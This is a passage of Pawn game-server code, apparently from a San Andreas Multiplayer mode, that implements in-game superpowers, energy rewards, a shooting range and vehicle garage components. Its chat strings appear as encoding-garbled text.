			case 1: // Teleport Behind Player
			{
				id = FindPlayer(playerid,12,3.0);
				if(id == -1) return SendClientMessage(playerid,red," .ьр ЁюЎр ∙чўя");
				GetPlayerPos(id,p[0],p[1],p[2]);
				GetXYInFrontOfPlayer(id,p[0],p[1],-2.0);
				SetPlayerPos(playerid,p[0],p[1],p[2]);
				GetPlayerFacingAngle(id,p[0]);
				SetPlayerFacingAngle(playerid,p[0]);
			}
			case 2: // Player Replace
			{
				id = FindPlayer(playerid,12,3.0);
				if(id == -1) return SendClientMessage(playerid,red," .ьр ЁюЎр ∙чўя");
				new Float:tmp[4], Float:a;
				for(new i = 0; i < 3; i++) tmp[i] = p[i];
				GetPlayerFacingAngle(playerid,tmp[3]);
				GetPlayerPos(id,p[0],p[1],p[2]);
				GetPlayerFacingAngle(id,a);
				SetPlayerPos(playerid,p[0],p[1],p[2]);
				SetPlayerFacingAngle(playerid,a);
				SetPlayerPos(id,tmp[0],tmp[1],tmp[2]);
				SetPlayerFacingAngle(id,tmp[3]);
			}
			case 3: // Quick Evasion
			{
				playerinfo[playerid][quicklydefence] = 15;
				SendClientMessage(playerid,lightred," !ўщсь· ф·чюўх· юфщ°ф ь 15 ∙Ёщх·");
			}
			case 4: // Red World Illusion
			{
				id = FindPlayer(playerid,10,2.5);
				if(id == -1) return SendClientMessage(playerid,red," .ьр ЁюЎр ∙чўя");
				SetPlayerWeather(id,44);
				SetPlayerTime(id,21,0);
			}
			case 5: // Fire Illusin
			{
				id = FindPlayer(playerid,10,2.5);
				if(id == -1) return SendClientMessage(playerid,red," .ьр ЁюЎр ∙чўя");
				SetPlayerWeather(id,40);
				SetPlayerTime(id,23,0);
				SetPlayerAttachedObject(id,aoslot_purim,18690,1,-0.4,0.0,-1.7,0.0,0.0,0.0,1.0,1.0,1.0);
			}
			case 6: // Eye Laser
			{
				SetPlayerAttachedObject(playerid,aoslot_godeyeright,18643,1,0.360000,0.000000,0.029999,0.000000,0.000000,90.000000,1.000000,1.000000,1.000000);
				SetPlayerAttachedObject(playerid,aoslot_godeyeleft,18643,1,0.360000,0.000000,-0.029999,0.000000,0.000000,90.000000,1.000000,1.000000,1.000000);
				SetTimerEx("LaserEye",500,0,"ii",playerid,1);
			}
			case 7: // Copy Ultimate Power
			{
				new maxi = 20;
				for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && GetPlayerDistanceToPointEx(i,p[0],p[1],p[2]) <= 9.0 && playerinfo[i][copypower][0] != -1 && i != playerid && playerinfo[i][copypower][2] > 0 && playerinfo[i][copypower][2] < maxi) maxi = playerinfo[i][copypower][2], id = i;
				if(id == -1) return SendClientMessage(playerid,red," .ьр ЁюЎр ∙чўя");
				playerinfo[playerid][upower3][0] = playerinfo[id][copypower][0], playerinfo[playerid][upower3][1] = playerinfo[id][copypower][1];
				format(string,sizeof(string)," .ыЄ·, ·хыь ьф∙·ю∙ сх ЇЄэ рч· сьсу, Є\"щ ыъ ∙·ьчї Єь ыь фюў∙щэ фюхЇщЄщэ Єь фюёъ !%s фЄ·ў· р· фыхч фрхьшщюшщсщ ∙ь",GetName(id));
				SendClientMessage(playerid,green,string);
				GameTextForPlayer(playerid,"~b~copied ultimate power keys:~n~~y~~k~~PED_SPRINT~~b~ + ~y~~k~~PED_JUMPING~~b~ + ~y~~k~~SNEAK_ABOUT~",6500,0);
			}
			case 8: // Erase Circle
			{
				GetXYInFrontOfPlayer(playerid,p[0],p[1],6.5);
				new o = CreateSObject(18741,p[0],p[1],p[2]-2.0,0.0,0.0,0.0);
				playerinfo[playerid][erase] = 20;
				for(new i = 0; i < 3; i++) playerinfo[playerid][erapos][i] = (i == 2 ? (p[i]-2.0) : p[i]);
				SetTimerEx("ObjectTimerAct",20000,0,"iiiii",o,0,0,1,world_normal);
			}
		}
		case 8: switch(powerlevel) // Hand of God
		{
			case 1: // Velocity Up
			{
				id = FindPlayer(playerid,9,2.5);
				if(id != -1)
				{
					SetPlayerVelocity(id,0.0,0.0,2.0);
					for(new i = 0; i < 3; i++) SetPlayerForwardVelocity(id,-0.1,2.8);
				}
			}
			case 2: // Gravitating
			{
				id = FindPlayer(playerid,9,2.5);
				if(id != -1 && GetPlayerState(id) == PLAYER_STATE_ONFOOT) SetPlayerVelocityToPos(id,p[0],p[1],2.0,0.5);
			}
			case 3: // Weapon Magnet
			{
				id = FindPlayer(playerid,9,2.5);
				if(id != -1 && GetPlayerState(id) == PLAYER_STATE_ONFOOT)
				{
					new wd[2];
					for(new i = 1; i < 13; i++)
					{
						GetPlayerWeaponData(id,i,wd[0],wd[1]);
						if(wd[0] != 0 && wd[1] != 0) GiveWeapon(playerid,wd[0],wd[1]);
					}
					ResetWeapons(id);
				}
			}
			case 4: // Insects Attack
			{
				new pl[MAX_PLAYERS], ps = 0, o, Float:po[3];
				for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && i != playerid && IsPlayerStreamedIn(i,playerid) && IsPlayerInRangeOfPoint(i,20.0,p[0],p[1],p[2])) pl[ps++] = i;
				for(new i = 0; i < ps; i++)
				{
					o = CreateSObject(18698,p[0],p[1],p[2],0.0,0.0,floatrand(0.0,360.0));
					GetPlayerPos(pl[i],po[0],po[1],po[2]);
					MoveSObject(o,po[0],po[1],po[2],5.0);
					if(IsPlayerInAnyVehicle(pl[i])) objectinfo[o][oeam] = 12;
					else objectinfo[o][odmg] = 60.0;
					objectinfo[o][odam] = 1;
				}
			}
			case 5: // Animals Attack
			{
				new pl[MAX_PLAYERS], ps = 0, o, Float:po[3], animals[] = {19078,19079,16442,1602,1603,1609,1607,1608}, mod;
				for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && i != playerid && IsPlayerStreamedIn(i,playerid) && IsPlayerInRangeOfPoint(i,20.0,p[0],p[1],p[2])) pl[ps++] = i;
				for(new i = 0; i < ps; i++)
				{
					mod = animals[random(sizeof(animals))];
					o = CreateSObject(mod,p[0],p[1],p[2],0.0,0.0,floatrand(0.0,360.0));
					GetPlayerPos(pl[i],po[0],po[1],po[2]);
					MoveSObject(o,po[0],po[1],po[2],floatrand(5.5,8.0));
					objectinfo[o][oeam] = mod <= 1603 || mod >= 19078 ? 12 : 6;
					objectinfo[o][odmg] = 40.0;
					objectinfo[o][odam] = 1;
				}
			}
			case 6: // The Devil Curse
			{
				id = FindPlayer(playerid,5,2.5);
				if(id != -1)
				{
					SendClientMessage(playerid,green," .р·ф ю∙·ю∙ ыЄ· сю·ўЇ· ўьь· ф∙шя, фчщщэ хфютя ∙ь фўх°ся щфщх ∙ххщэ ь∙ьъ юЄы∙щх");
					SendClientMessage(playerid,green," .фўььф ЁЇёў· ыр∙° р·ф рх фўх°ся ю·щэ");
					playerinfo[playerid][powerparam] = powerparam_devilcurse, playerinfo[playerid][cursed] = id, playerinfo[id][useddevilcurse] = playerid;
				}
			}
			case 7: // Reincarnation
			{
				for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && i != playerid && playerinfo[i][deathdelay] > 0 && DistanceToPoint(p[0],p[1],p[2],playerinfo[i][deathpos][0],playerinfo[i][deathpos][1],playerinfo[i][deathpos][2]) <= 30.0) SetPlayerPos(i,playerinfo[i][deathpos][0],playerinfo[i][deathpos][1],playerinfo[i][deathpos][2]);
			}
			case 8: // Mother Earth
			{
				new garden[] = {669,683,763,801,819,870,877,3532,3520,8619,8623,8887,9019,9152,11413}, num = randomEx(10,21), plant[20], plants = 0;
				for(new i = 0; i < num; i++) plant[plants++] = CreateSObject(garden[random(sizeof(garden))],p[0]+floatrand(p[0]-20.0,p[0]+20.0),p[1]+floatrand(p[1]-20.0,p[1]+20.0),p[2]-5.0,0.0,0.0,floatrand(0.0,360.0));
				for(new i = 0; i < plants; i++)
				{
					GetSObjectPos(plant[i],p[0],p[1],p[2]);
					MoveSObject(plant[i],p[0],p[1],p[2],floatrand(3.0,8.0));
					objectinfo[plant[i]][odmg] = 50.0;
					SetTimerEx("ObjectTimerAct",3000,0,"iiiii",plant[i],0,0,1,world_normal);
				}
			}
			case 9: // Moon Attack
			{
				GetXYInFrontOfPlayer(playerid,p[0],p[1],8.0);
				new o = CreateSObject(19299,p[0],p[1],p[2],0.0,0.0,0.0);
				for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerStreamedIn(i,playerid) && IsPlayerInRangeOfPoint(i,45.0,p[0],p[1],p[2]))
				{
					SetPlayerTime(i,0,0);
					SetTimerEx("MoonAttack",3000,0,"ii",i,playerid == i ? 0 : 1);
				}
				SetTimerEx("ObjectTimerAct",5000,0,"iiiii",o,0,0,1,world_normal);
			}
		}
	}
	if(id == -1) format(string,sizeof(string)," !%s-ф∙·ю∙ с %s",GetUPLTitle(powertype,powerlevel),GetName(playerid));
	else format(string,sizeof(string)," !%s Єь %s-ф∙·ю∙ с %s",GetName(id),GetUPLTitle(powertype,powerlevel),GetName(playerid));
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerStreamedIn(i,playerid) && IsPlayerInRangeOfPoint(i,25.0,p[0],p[1],p[2]))
	{
		SendClientMessage(i,UltimatePowers[playerinfo[playerid][upower]][upHex],string);
		Streamer_Update(i);
	}
	Streamer_Update(playerid);
	if(id != -1)
	{
		format(string,sizeof(string)," !%s-ф∙·ю∙ Ётуъ с %s",GetUPLTitle(powertype,powerlevel),GetName(playerid));
		SendClientMessage(id,UltimatePowers[playerinfo[playerid][upower]][upHex],string);
	}
	format(string,sizeof(string),"UPower: %s\n%s",UltimatePowers[playerinfo[playerid][upower]][upTitle],GetUPLTitle(powertype,powerlevel));
	SetPlayerChatBubble(playerid,string,UltimatePowers[playerinfo[playerid][upower]][upHex],20.0,3000);
	if(IsUPLTakingEnPerSecond(powertype,powerlevel))
	{
		playerinfo[playerid][usepower] = 1;
		SetTimerEx("TakeEnergyByTimer",1000,0,"ii",playerid,take);
	}
	else TakeEnergy(playerid,take);
	return 1;
}
//=[CanUseUltimatePower]========================================================
stock CanUseUltimatePower(playerid) return GetPlayerState(playerid) == PLAYER_STATE_ONFOOT && playerinfo[playerid][dmzone] == dmz_none && playerinfo[playerid][tdmzone] == tdmz_none && !playerinfo[playerid][inact] && !GetPlayerInterior(playerid) && !GetPlayerVirtualWorld(playerid) && playerinfo[playerid][powerparam] == powerparam_none && !playerinfo[playerid][inbattle] && playerinfo[playerid][inmarea] == -1 && !playerinfo[playerid][frozen][0];
//=[CanUseScroll]===============================================================
stock CanUseScroll(playerid) return playerinfo[playerid][dmzone] == dmz_none && playerinfo[playerid][tdmzone] == tdmz_none && !playerinfo[playerid][inact] && !playerinfo[playerid][inbattle];
//=[GetUltimatePowerMaxLevel_Init]==============================================
stock GetUltimatePowerMaxLevel_Init(u)
{
	new c = 0;
	#define testc(%0) if(UltimatePowers[u][upPower%0][uplLevel] != -1) c++; else return c
	testc(1);
	testc(2);
	testc(3);
	testc(4);
	testc(5);
	testc(6);
	testc(7);
	testc(8);
	testc(9);
	#undef testc
	return c;
}
//=[GetUltimatePowerMaxLevel]===================================================
stock GetUltimatePowerMaxLevel(u) return upower_MaxLevel[u];
//=[GetUPLTitle_Init]===========================================================
stock GetUPLTitle_Init(u,ulvl)
{
	new ret[64];
	#define testu(%0) if(ulvl == %0) format(ret,sizeof(ret),UltimatePowers[u][upPower%0][uplTitle])
	testu(1);
	testu(2);
	testu(3);
	testu(4);
	testu(5);
	testu(6);
	testu(7);
	testu(8);
	testu(9);
	#undef testu
	return ret;
}
//=[GetUPLTitle]================================================================
stock GetUPLTitle(u,ulvl)
{
	new ret[64];
	if(ulvl < 1 || ulvl > upower_MaxLevel[u]) ret[0] = '-', ret[1] = 0;
	else format(ret,sizeof(ret),upower_Title[u][ulvl-1]);
	return ret;
}
//=[GetUPLNeededLevel_Init]=====================================================
stock GetUPLNeededLevel_Init(u,ulvl)
{
	new ret = 0;
	#define testu(%0) if(ulvl == %0) ret = UltimatePowers[u][upPower%0][uplLevel]
	testu(1);
	testu(2);
	testu(3);
	testu(4);
	testu(5);
	testu(6);
	testu(7);
	testu(8);
	testu(9);
	#undef testu
	return ret;
}
//=[GetUPLNeededLevel]==========================================================
stock GetUPLNeededLevel(u,ulvl) return ulvl < 1 || ulvl > upower_MaxLevel[u] ? -1 : upower_NeededLevel[u][ulvl-1];
//=[GetUPLEnCost_Init]==========================================================
stock GetUPLEnCost_Init(u,ulvl)
{
	new ret = 0;
	#define testu(%0) if(ulvl == %0) ret = UltimatePowers[u][upPower%0][uplEnergy]
	testu(1);
	testu(2);
	testu(3);
	testu(4);
	testu(5);
	testu(6);
	testu(7);
	testu(8);
	testu(9);
	#undef testu
	return ret;
}
//=[GetUPLEnCost]===============================================================
stock GetUPLEnCost(u,lvl) return lvl < 1 || lvl > upower_MaxLevel[u] ? -1 : upower_Cost[u][lvl-1];
//=[IsUPLTakingEnPerSecond_Init]================================================
forward bool:IsUPLTakingEnPerSecond_Init(u,ulvl);
stock bool:IsUPLTakingEnPerSecond_Init(u,ulvl)
{
	new bool:ret = false;
	#define testu(%0) if(ulvl == %0) ret = UltimatePowers[u][upPower%0][uplPerSecond]
	testu(1);
	testu(2);
	testu(3);
	testu(4);
	testu(5);
	testu(6);
	testu(7);
	testu(8);
	testu(9);
	#undef testu
	return ret;
}
//=[IsUPLTakingEnPerSecond]=====================================================
forward bool:IsUPLTakingEnPerSecond(u,ulvl);
stock bool:IsUPLTakingEnPerSecond(u,ulvl) return ulvl < 1 || ulvl > upower_MaxLevel[u] ? false : upower_TakingEnPS[u][ulvl-1];
//=[ShowUPowerInfo]=============================================================
stock ShowUPowerInfo(playerid,pow)
{
	new enstr[16], string[M_S];
	format(string,sizeof(string)," ~~~ :%s - °юх· фыхч ~~~",UltimatePowers[pow][upTitle]);
	SendClientMessage(playerid,lightblue,string);
	for(new i = 1, m = GetUltimatePowerMaxLevel(pow), lvl; i <= m; i++)
	{
		if(IsUPLTakingEnPerSecond(pow,i)) format(enstr,sizeof(enstr),"ь∙Ёщщф %d",GetUPLEnCost(pow,i));
		else valstr(enstr,GetUPLEnCost(pow,i));
		format(string,sizeof(string)," %02d) %s [Level: %d | Energy: %s]",i,GetUPLTitle(pow,i),lvl = GetUPLNeededLevel(pow,i),enstr);
		SendClientMessage(playerid,playerinfo[playerid][level] >= lvl ? green : red,string);
	}
	return 1;
}
//=[UpdatePlayerUPChargeTD]=====================================================
stock UpdatePlayerUPChargeTD(playerid,u,ch)
{
	#pragma unused u
	new string[64], PlayerText:td;
	//format(string,sizeof(string),"~n~~n~~n~~n~~n~~n~~n~~r~ultimate power: ~b~%02d",ch/2);
	//GameTextForPlayer(playerid,string,900,5);
	format(string,sizeof(string),GetUPLTitle(u,ch/2));
	if(strlen(string) <= 1) return 1;
	format(string,sizeof(string),"%s (%d):~n~%s",UltimatePowers[u][upTitle],ch/2,string);
	td = CreatePlayerTextDraw(playerid,91.000000,311.000000,string);
	PlayerTextDrawAlignment(playerid,td,2);
	PlayerTextDrawBackgroundColor(playerid,td,255);
	PlayerTextDrawFont(playerid,td,3);
	PlayerTextDrawLetterSize(playerid,td,0.360000,1.100000);
	PlayerTextDrawColor(playerid,td,UltimatePowers[u][upHex]);
	PlayerTextDrawSetOutline(playerid,td,1);
	PlayerTextDrawSetProportional(playerid,td,1);
	ShowTempTextDraw(playerid,900,temptext_upower,td,1);
	return 1;
}
//=[SetPlayerToNormalColor]=====================================================
stock SetPlayerToNormalColor(playerid) return SetPlayerColor(playerid,GetColor(playerid,PLAYER_ALPHA));
//=[GetPlayerCameraLine]========================================================
stock GetPlayerCameraLine(playerid,&Float:x,&Float:y,&Float:z,Float:scale)
{
	new Float:p[3], Float:v[3];
	GetPlayerCameraPos(playerid,p[0],p[1],p[2]);
	GetPlayerCameraFrontVector(playerid,v[0],v[1],v[2]);
	x = p[0] + floatmul(v[0],scale), y = p[1] + floatmul(v[1],scale), z = p[2] + floatmul(v[2],scale);
	return 1;
}
//=[IsVehicleUpsideDown]========================================================
stock IsVehicleUpsideDown(vehicleid)
{
	new Float:quat_w,Float:quat_x,Float:quat_y,Float:quat_z;
	GetVehicleRotationQuat(vehicleid,quat_w,quat_x,quat_y,quat_z);
	new Float:y = atan2(2*((quat_y*quat_z)+(quat_w*quat_x)),(quat_w*quat_w)-(quat_x*quat_x)-(quat_y*quat_y)+(quat_z*quat_z));
	return (y > 90 || y < -90);
}
//=[SetPlayerForwardVelocity]===================================================
stock SetPlayerForwardVelocity(playerid,Float:Velocity,Float:Z)
{	// by Adas, improved by me
	new Float:Angle, Float:SpeedX, Float:SpeedY;
	GetPlayerFacingAngle(playerid, Angle);
	SpeedX = floatsin(-Angle,degrees);
	SpeedY = floatcos(-Angle,degrees);
	SetPlayerVelocity(playerid,floatmul(Velocity,SpeedX),floatmul(Velocity,SpeedY),Z);
	return 1;
}
//=[SetVehicleForwardVelocity]==================================================
stock SetVehicleForwardVelocity(vehicleid,Float:Velocity,Float:Z)
{
	new Float:Angle, Float:SpeedX, Float:SpeedY;
	GetVehicleZAngle(vehicleid, Angle);
	SpeedX = floatsin(-Angle,degrees);
	SpeedY = floatcos(-Angle,degrees);
	SetVehicleVelocity(vehicleid,floatmul(Velocity, SpeedX),floatmul(Velocity,SpeedY),Z);
}
//=[CenterOfPoints]=============================================================
stock CenterOfPoints(Float:val1,Float:val2) return floatdiv(floatadd(val1,val2),2);
//=[ExtFire]====================================================================
/*
	Functions from "ExtFire"
	by Meta
	Improved by me
*/
stock AddFire(Float:x,Float:y,Float:z) return CallRemoteFunction("AddFire","fff",x,y,z);
stock KillFire(id) return CallRemoteFunction("KillFire","i",id);
stock SetPlayerBurn(playerid) return CallRemoteFunction("SetPlayerBurn","i",playerid);
stock StopPlayerBurning(playerid) return CallRemoteFunction("StopPlayerBurning","i",playerid);
stock GetFireID(Float:x, Float:y, Float:z, &Float:dist) return CallRemoteFunction("GetFireID","ffff",x,y,z,dist);
//=[ArcFly]=====================================================================
stock ArcFly(objectid,Float:newx,Float:newy,Float:newz,Float:movespeed)
{
	new Float:oldx, Float:oldy, Float:oldz;
	GetSObjectPos(objectid,oldx,oldy,oldz);
	AddSObjectPath(objectid,floatdiv((oldx+newx),4),floatdiv((oldy+newy),4),floatdiv((oldz+newz),4),movespeed);
	AddSObjectPath(objectid,floatdiv((oldx+newx),2),floatdiv((oldy+newy),2),floatdiv((oldz+newz),2),movespeed);
	AddSObjectPath(objectid,floatdiv((oldx+newx),0.33333),floatdiv((oldy+newy),0.33333),floatdiv((oldz+newz),0.33333),movespeed);
	AddSObjectPath(objectid,newx,newy,newz,movespeed);
	return 1;
}
//=[AddSObjectPath]=============================================================
stock AddSObjectPath(objectid,Float:x,Float:y,Float:z,Float:movespeed,Float:rx = -1000.0,Float:ry = -1000.0,Float:rz = -1000.0)
{
	objectinfo[objectid][opath][(objectinfo[objectid][opaths]*7)] = x;
	objectinfo[objectid][opath][(objectinfo[objectid][opaths]*7)+1] = y;
	objectinfo[objectid][opath][(objectinfo[objectid][opaths]*7)+2] = z;
	objectinfo[objectid][opath][(objectinfo[objectid][opaths]*7)+3] = movespeed;
	objectinfo[objectid][opath][(objectinfo[objectid][opaths]*7)+4] = rx;
	objectinfo[objectid][opath][(objectinfo[objectid][opaths]*7)+5] = ry;
	objectinfo[objectid][opath][(objectinfo[objectid][opaths]*7)+6] = rz;
	if(!objectinfo[objectid][opaths]) MoveSObject(objectid,x,y,z,movespeed,rx,ry,rz);
	objectinfo[objectid][opaths]++;
	objectinfo[objectid][odonepaths] = 0;
	return 1;
}
//=[StopPlayer]=================================================================
stock StopPlayer(playerid)
{
	SetPlayerArmedWeapon(playerid,playerinfo[playerid][weapons][8] != 0 ? 1 : 0);
	SetFreeze(playerid,1);
	SetFreeze(playerid,0);
	PlaySound(playerid,1085);
	return 1;
}
//=[SRL_XLine]==================================================================
stock SRL_XLine(line,&Float:x,&Float:y,&Float:z,start=1)
{
	if(line == -1) line = randomEx(1,3);
	switch(line)
	{
		case 1: y = -66.8234;
		case 2: y = -61.7627;
	}
	x = start ? 304.7485 : 329.6270, z = 1001.5156;
	return line;
}
//=[SRL_YLine]==================================================================
stock SRL_YLine(line,&Float:x,&Float:y,&Float:z,start=1)
{
	if(line == -1) line = randomEx(1,5);
	switch(line)
	{
		case 1: x = 305.8150;
		case 2: x = 310.9509;
		case 3: x = 316.6614;
		case 4: x = 326.3280;
	}
	y = start ? -57.1647 : -71.5605, z = 1001.5156;
	return line;
}
//=[SRL_RandomPoint]============================================================
stock SRL_RandomPoint(&Float:x,&Float:y,&Float:z) x = 316.5 + floatrand(-10.0,10.0), y = -64.0 + floatrand(-5.0,5.0), z = 1001.5156;
//=[SR_ObjectPerSecond]=========================================================
stock SR_ObjectPerSecond(lvl)
{
	switch(lvl)
	{
		case 1: return 5;
		case 2: return 4;
		case 3: return 2;
	}
	return 0;
}
//=[CheckObjectParams]==========================================================
stock CheckObjectParams(objectid)
{
	new Float:p[3];
	if(objectinfo[objectid][oeam] > 0)
	{
		GetSObjectPos(objectid,p[0],p[1],p[2]);
		if(objectinfo[objectid][oeam] == 14) HydrogenBoom(p[0],p[1],p[2],0,objectinfo[objectid][oworld]);
		else if(objectinfo[objectid][oeam] == 15 || objectinfo[objectid][oeam] == 16)
		{
			SetTimerEx("ObjectTimerAct",1500,0,"iiiii",CreateSObject(objectinfo[objectid][oeam] == 15 ? 18742 : 18724,p[0],p[1],p[2],0.0,0.0,0.0),0,0,1,world_normal);
			CreateExplosionVW(p[0],p[1],p[2],12,0.1,objectinfo[objectid][oworld]);
		}
		else CreateExplosionVW(p[0],p[1],p[2],objectinfo[objectid][oeam] == 13 ? 7 : objectinfo[objectid][oeam],objectinfo[objectid][oeam] == 13 ? 0.3 : 0.1,objectinfo[objectid][oworld]);
	}
	if(objectinfo[objectid][odmg] > 0.0)
	{
		if(!objectinfo[objectid][oeam]) GetSObjectPos(objectid,p[0],p[1],p[2]);
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerInRangeOfPoint(i,3.0,p[0],p[1],p[2])) if(objectinfo[objectid][odmg] >= 200.0) SetPlayerHealth(i,0.0); else Damage(i,objectinfo[objectid][odmg]);
	}
	if(objectinfo[objectid][odam])
	{
		if(objectinfo[objectid][oworld] >= world_count)
		{
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][srin] && playerinfo[i][srstarted]) for(new j = 0; j < 15; j++) if(playerinfo[i][srobj][j] == objectid)
			{
				playerinfo[i][srobj][j] = -1;
				break;
			}
		}
		DestroySObject(objectid);
	}
}
//=[AddToSRObjectList]==========================================================
stock AddToSRObjectList(playerid,objectid)
{
	new id = -1;
	for(new i = 0; i < 15 && id == -1; i++) if(playerinfo[playerid][srobj][i] == -1) id = i;
	if(id != -1) playerinfo[playerid][srobj][id] = objectid, playerinfo[playerid][srobjs]++;
	return 1;
}
//=[StopShootingRange]==========================================================
stock StopShootingRange(playerid)
{
	playerinfo[playerid][srin] = 0;
	playerinfo[playerid][srstarted] = 0;
	SetFreeze(playerid,0);
	SetPlayerVirtualWorld(playerid,world_normal);
	SetCameraBehindPlayer(playerid);
	for(new i = 0; i < 15; i++) if(playerinfo[playerid][srobj][i] != -1 && objectinfo[playerinfo[playerid][srobj][i]][ovalid])
	{
		DestroySObject(playerinfo[playerid][srobj][i]);
		playerinfo[playerid][srobj][i] = -1;
	}
	KillTimer(playerinfo[playerid][srtimer]);
	playerinfo[playerid][srseconds] = 0;
	playerinfo[playerid][srobjs] = 0;
	return 1;
}
//=[AddSGarageComponent]========================================================
stock AddSGarageComponent(name[],cost,text[])
{
	new string[32], row = AddMenuItem(sgarageMenu,0,name);
	format(string,sizeof(string),"%d$",cost);
	AddMenuItem(sgarageMenu,1,string);
	SetString(sgarageinfo[row][gcName],name);
	SetString(sgarageinfo[row][gcText],text);
	sgarageinfo[row][gcCost] = cost, sgarageinfo[row][gcValid] = 1;
	return 1;
}
//=[UpdateNitro]================================================================
stock UpdateNitro(v,playerid)
{
	new got = GetVehicleComponentInSlot(v,5);
	if(got >= 1008 && got <= 1010) RemoveVehicleComponent(v,got);
	AddVehicleComponent(v,1010,playerid);
	return 1;
}
//=[TakeSpecialComponent]=======================================================
stock TakeSpecialComponent(playerid)
{
	if(playerinfo[playerid][sgcomp] != -1)
	{
		new string[M_S], v = GetPlayerVehicleID(playerid);
		format(string,sizeof(string)," !Ёючў ьъ \"%s\" ф∙щЇх° фющхчу",sgarageinfo[playerinfo[playerid][sgcomp]][gcName]);
		SendClientMessage(playerid,red,string);
		switch(playerinfo[playerid][sgcomp])
		{
			case 0: // Infinite Nitro
			{
				new got = GetVehicleComponentInSlot(v,5);
				if(got >= 1008 && got <= 1010) RemoveVehicleComponent(v,got);
			}
			//case 1: // Turbo
			case 2: // Random Colors
			{
				playerinfo[playerid][cvcolor] = 0;
			}
			case 3: // Vehicle Rockets
			{
				for(new i = 0; i < 2; i++) if(IsValidObject(vehicleinfo[v][vrockets][i]))
				{
					DestroyObject(vehicleinfo[v][vrockets][i]);
					vehicleinfo[v][vrockets][i] = -1;
				}
			}
		}
		playerinfo[playerid][sgcomp] = -1;
	}
	return 1;
}
//=[StopUsingPower]=============================================================
stock StopUsingPower(playerid)
{
	switch(playerinfo[playerid][powerparam])
	{
		case powerparam_fountain, powerparam_waterfall: DestroySObject(playerinfo[playerid][waterobj]);
		case powerparam_return: if(IsFlying(playerid)) StopFlying(playerid);
		case powerparam_energy: playerinfo[playerid][energyrelease] = INVALID_PLAYER_ID, playerinfo[playerid][energypump] = INVALID_PLAYER_ID, playerinfo[playerid][energystraw] = INVALID_PLAYER_ID;
		case powerparam_devilcurse: playerinfo[playerinfo[playerid][cursed]][useddevilcurse] = INVALID_PLAYER_ID, playerinfo[playerid][cursed] = INVALID_PLAYER_ID;
	}
	playerinfo[playerid][usepower] = 0, playerinfo[playerid][powerparam] = powerparam_none;
	return 1;
}
//=[ShowTempTextDraw]===========================================================
stock ShowTempTextDraw(playerid,interval,id,PlayerText:txt,des = 0)
{
	new n = -1;
	if(IsTempTextShowing(playerid,id)) n = RemoveTempText(playerid,id);
	if(n == -1) for(new i = 0; i < max_temptexts && n == -1; i++) if(playerinfo[playerid][temptextid][i] == temptext_none) n = i;
	if(n == -1) return 1;
	playerinfo[playerid][temptext][n] = txt;
	playerinfo[playerid][temptextid][n] = id;
	playerinfo[playerid][temptextdes][n] = des;
	playerinfo[playerid][temptexttimer][n] = SetTimerEx("TempTextDraw",interval,0,"iii",playerid,n,des);
	PlayerTextDrawShow(playerid,txt);
	return 1;
}
//=[IsTempTextShowing]==========================================================
stock IsTempTextShowing(playerid,id)
{
	for(new i = 0; i < max_temptexts; i++) if(playerinfo[playerid][temptextid][i] == id) return 1;
	return 0;
}
//=[RemoveTempText]=============================================================
stock RemoveTempText(playerid,id)
{
	new n = -1;
	for(new i = 0; i < max_temptexts && n == -1; i++) if(playerinfo[playerid][temptextid][i] == id) n = i;
	if(n == -1) return 1;
	if(playerinfo[playerid][temptexttimer][n] != -1) KillTimer2(playerinfo[playerid][temptexttimer][n]);
	TempTextDraw(playerid,n,playerinfo[playerid][temptextdes][n]);
	return 1;
}
//=[SetPlayerTempWeather]=======================================================
stock SetPlayerTempWeather(playerid,weatherid,interval)
{
	SetPlayerWeather(playerid,weatherid);
	SetTimerEx("TempWeather",interval,0,"i",playerid);
}
//=[GetZBetweenPlayers]=========================================================
forward Float:GetZBetweenPlayers(playerid,playerid2);
stock Float:GetZBetweenPlayers(playerid,playerid2)
{
	new Float:p[4];
	GetPlayerPos(playerid,p[0],p[0],p[1]);
	GetPlayerPos(playerid2,p[2],p[2],p[3]);
	return p[3] - p[1];
}
//=[AddKillingEnergy]===========================================================
stock AddKillingEnergy(killerid,playerid,reason)
{
	new x = 0, vt = -1, vp = 0, toadd = 0,
		bool:v = playerinfo[playerid][lastv] != INVALID_VEHICLE_ID && (playerinfo[playerid][ostate] == PLAYER_STATE_DRIVER || playerinfo[playerid][ostate] == PLAYER_STATE_PASSENGER);
	if(v)
	{
		vt = GetVehicleType(playerinfo[playerid][lastv]);
		if(vt == 0 || vt == 1 || vt == 2) vp = 3;
		else if(vt == 3 || vt == 4) vp = 5;
		toadd++;
	}
	switch(reason)
	{
		case 0, 1, 14, 15: x = 5;
		case 2, 3, 5..13: x = 4;
		case 4: x = IsPlayerBehindPlayer(killerid,playerid,1.0) ? 5 : 4;
		case 16: x = v ? vp : 1;
		case 18: x = 2;
		case 22, 28, 32: x = 2 + toadd;
		case 25, 27, 29: x = 3 + toadd;
		case 23: x = playerinfo[killerid][headshooter] ? 4 : 3;
		case 24: x = playerinfo[killerid][headshooter] ? 5 : 3;
		case 26: x = playerinfo[killerid][using22] > 0 ? 0 : (1 + toadd);
		case 30, 31, 33, 34: x = 3 + (vt == 3 || vt == 4 ? 1 : 0) + (floatabs(GetZBetweenPlayers(playerid,killerid)) > 10.0 ? 1 : 0);
		case 35, 36: x = v ? vp : -1;
		case 37: x = 3;
		case 38: x = v ? 3 : 1;
		case 41, 42: x = 3;
		case 49: x = 2;
		case 50: x = -1;
		case 51: x = 1;
	}
	if(x < 0) TakeEnergy(killerid,x);
	else if(x > 0) AddEnergy(killerid,Options[5][optActive] ? x*2 : x);
	return 1;
}
//=[SetPlayerVelocityToPos]=====================================================
stock SetPlayerVelocityToPos(playerid,Float:x,Float:y,Float:velxy,Float:velz)
{
	new Float:a;
	GetPlayerFacingAngle(playerid,a);
	SetPlayerLookAt(playerid,x,y);
	SetPlayerForwardVelocity(playerid,velxy,velz);
	SetPlayerFacingAngle(playerid,a);
	return 1;
}
